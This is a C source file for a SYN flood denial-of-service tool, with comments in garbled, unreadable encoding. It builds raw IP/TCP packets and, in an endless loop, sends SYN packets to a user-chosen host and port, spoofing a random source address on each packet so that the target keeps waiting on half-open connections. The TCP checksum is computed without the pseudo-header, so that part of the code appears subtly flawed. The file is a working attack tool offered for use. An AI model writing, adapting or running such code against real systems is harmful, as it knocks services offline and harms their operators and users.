#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/tcp.h>

//�����Լ�д�Ĺ�������
void attack(int skfd,struct sockaddr_in *target,unsigned short srcport);
//���ʲô�����ں�����������߯��ˬ�ˣ���Ҳ���ż���һ��У��͡�
unsigned short check_sum(unsigned short *addr,int len);

int main(int argc,char** argv){
        int skfd;
        struct sockaddr_in target;
        struct hostent *host;
        const int on=1;
        unsigned short srcport;

        if(argc!=4)
        {
                printf("Usage:%s target dstport srcport\n",argv[0]);
                exit(1);
        }
		
		//DNSЭ�����
        bzero(&target,sizeof(struct sockaddr_in));
        target.sin_family=AF_INET;
        target.sin_port=htons(atoi(argv[2]));

        if(inet_aton(argv[1],&target.sin_addr)==0)
        {
                host=gethostbyname(argv[1]);
                if(host==NULL)
                {
                        printf("TargetName Error:%s\n",hstrerror(h_errno));
                        exit(1);
                }
                target.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
        }

        //��Э���ֶ���ΪIPPROTO_TCP��������һ��TCP��ԭʼ�׽���
        if(0>(skfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))){
                perror("Create Error");
                exit(1);
        }

        //��ģ�����������IP_HDRINCL���ԣ�������ȫ�Լ��ֶ�����IP����
         if(0>setsockopt(skfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))){
                perror("IP_HDRINCL failed");
                exit(1);
        }

        //��Ϊֻ��root�û��ſ���play with raw socket :)
        setuid(getpid());
        srcport = atoi(argv[3]);
        attack(skfd,&target,srcport);
}

//�ڸú����й�������IP���ģ�������sendto���������ķ��ͳ�ȥ
void attack(int skfd,struct sockaddr_in *target,unsigned short srcport){
        char buf[128]={0};
        struct ip *ip;
        struct tcphdr *tcp;
        int ip_len;

        //������TCP�ı�����Dataû���ֶΣ���������IP���ĵĳ���
        ip_len = sizeof(struct ip)+sizeof(struct tcphdr);
        //��ʼ���IP�ײ�
        ip=(struct ip*)buf;

        ip->ip_v = IPVERSION;
        ip->ip_hl = sizeof(struct ip)>>2;
        ip->ip_tos = 0;
        ip->ip_len = htons(ip_len);
        ip->ip_id=0;
        ip->ip_off=0;
        ip->ip_ttl=MAXTTL;
        ip->ip_p=IPPROTO_TCP;
        ip->ip_sum=0;
        ip->ip_dst=target->sin_addr;

        //��ʼ���TCP�ײ�
        tcp = (struct tcphdr*)(buf+sizeof(struct ip));
        tcp->source = htons(srcport);
        tcp->dest = target->sin_port;
        tcp->seq = random();
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->check = 0;

        while(1){
                //Դ��ַα�죬��������������ɸ���ַ���÷�����һֱ�ȴ���ȥ
                ip->ip_src.s_addr = random();
                tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
                sendto(skfd,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
        }
}


unsigned short check_sum(unsigned short *addr,int len){
        register int nleft=len;
        register int sum=0;
        register short *w=addr;
        short answer=0;

        while(nleft>1)
        {
                sum+=*w++;
                nleft-=2;
        }
        if(nleft==1)
        {
                *(unsigned char *)(&answer)=*(unsigned char *)w;
                sum+=answer;
        }

        sum=(sum>>16)+(sum&0xffff);
        sum+=(sum>>16);
        answer=~sum;
        return(answer);
}
